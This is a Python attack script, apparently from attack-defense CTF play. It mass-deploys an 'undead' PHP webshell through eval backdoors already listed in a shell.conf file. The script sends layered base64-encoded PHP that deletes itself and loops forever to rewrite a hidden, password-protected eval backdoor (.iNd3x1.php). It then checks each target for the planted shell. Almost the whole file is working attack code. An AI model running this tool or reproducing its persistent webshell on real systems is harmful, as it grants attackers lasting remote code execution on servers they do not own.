#!/usr/bin/python3
# -*-coding:UTF-8-*-
import sys
import requests
import os
from base64 import b64encode
from shutil import copyfile
from conf import settings

'''
作用：批量不死马上传，文件名 .iNd3x1.php
shell.conf 格式如下：
http://127.0.0.1:80/test/1.php,get,1
http://127.0.0.1:80/test/.iNd3x1.php,post,a
'''

def loadFile(filepath):
    try:
        file = open(filepath, "rb")
        return str(file.read().decode())
    except:
        print(f"\033[0;31;48m[-] File {filepath} Not Found!\033[0m")
        sys.exit()

def writeShell(filepath, shellurl):
    file = open(filepath, "a+")
    if shellurl.encode() in compare:
        print(f"\033[0;33;48m[*] {shellurl} has been writed in shell.conf\033[0m")
        return 0
    file.write(f"{shellurl},post,a\n")

def uploadShell(url, method, passwd):
    # 分割url ip 127.0.0.1:80 Rfile=/test/x.php?pass=AmTr41nS3c
    try:
        url.index("http")
        # 去除http:// ==> 127.0.0.1:80/test/x.php
        urlstr = url[7:]
        lis = urlstr.split("/")
        ip = str(lis[0])
        Rfile = ""
        for i in range(1, len(lis)):
            Rfile = Rfile + "/" + str(lis[i])
    except:
        urlstr = url[8:]
        lis = urlstr.split("/")
        ip = str(lis[0])
        Rfile = ""
        for i in range(1, len(lis)):
            Rfile = Rfile + "/" + str(lis[i])
    # 判断shell是否存在
    try:
        res = requests.get(url, timeout=3)
    except:
        print(f"\033[0;31;48m[-] {url} ERR_CONNECTION_TIMED_OUT\033[0m")
        return 0
    if res.status_code != 200:
        print(f"\033[0;31;48m[-] {url} Page Not Found!\033[0m")
        return 0

    # a=@eval(base64_decode($_GET[z0]));&z0=c3lzdGVtKCJ3aG9hbWkiKTs=
    shell_content = '''<?php if(md5(isset($_POST['pass'])?$_POST[pass]:"") == "9c5519e21487a28cbbcba8649a392be8"){@eval($_REQUEST[a]);}else{echo "r3kapig";}'''
    shell_content = b64encode(shell_content.encode()).decode()
    # 该部分可自行修改
    content = """<?php
        ignore_user_abort(true);
        set_time_limit(0);
        unlink(__FILE__);
        $file = '.iNd3x1.php';
        $code = '""" + shell_content + """';
        while (1){
            file_put_contents($file,base64_decode($code));
            usleep(5000);
        }?>"""
    content = b64encode(content.encode()).decode()
    content = "file_put_contents('.sh3l1.php',base64_decode('" + content + "'));"
    enc_death = b64encode(content.encode()).decode()
    # print(enc_death)
    data = {}

    if method == 'get':
        data[passwd] = '@eval(base64_decode($_GET[z0]));'
        data['z0'] = enc_death
        try:
            res = requests.get(url, params=data, timeout=3)
        except:
            pass
    elif method == 'post':
        data['pass'] = "AmTr41nS3c"
        data[passwd] = '@eval(base64_decode($_POST[z0]));'
        data['z0'] = enc_death
        try:
            res = requests.post(url, data=data, timeout=3)
        except:
            pass

    # 检查shell是否存在
    list = Rfile.split("/")
    b_url = "http://" + ip
    count = len(list) - 1
    for i in range(1, count):
        b_url = b_url + "/" + list[i]
    shell_url = b_url + "/.sh3l1.php"

    try:
        requests.get(shell_url, timeout=3)
    except:
        pass

    death_url = b_url + "/.iNd3x1.php"
    res = requests.get(death_url, timeout=3)

    if res.status_code != 200 or "r3kapig" not in res.text:
        print(f"\033[0;31;48m[-] {death_url} create shell failed!\033[0m")
        return 0
    else:
        writeShell(settings.config, death_url)
        print(f'\033[0;32;48m[+] {death_url} sucessed!\033[0m')

if __name__ == '__main__':
    shellList = loadFile(settings.config)
    list = shellList.split("\r\n")
    # print(str(list))
    i = 0
    url = {}
    passwd = {}
    method = {}
    # 该脚本在执行 ipwrite 后执行, 故不设置except
    copyfile(settings.config, settings.configbak)
    compare = open(settings.configbak, "rb").read()
    for data in list:
        if data != "":
            ls = data.split(",")
            method_tmp = str(ls[1])
            method_tmp = method_tmp.lower()
            if method_tmp == 'post' or method_tmp == 'get':
                url[i] = str(ls[0])
                method[i] = method_tmp
                passwd[i] = str(ls[2])
                i += 1
            else:
                print(f"\033[0;31;48m[-] {str(ls[0])} request method error!\033[0m")
        else:
            pass

    # print(str(len(url)))
    for j in range(len(url)):
        # 调用执行命令的模块
        # print(str(j))
        print(f"\033[0;33;48m[*] url is {url[j]} method is {method[j]} passwd is {passwd[j]}\033[0m")
        uploadShell(url=url[j], method=method[j], passwd=passwd[j])
    os.unlink(settings.configbak)
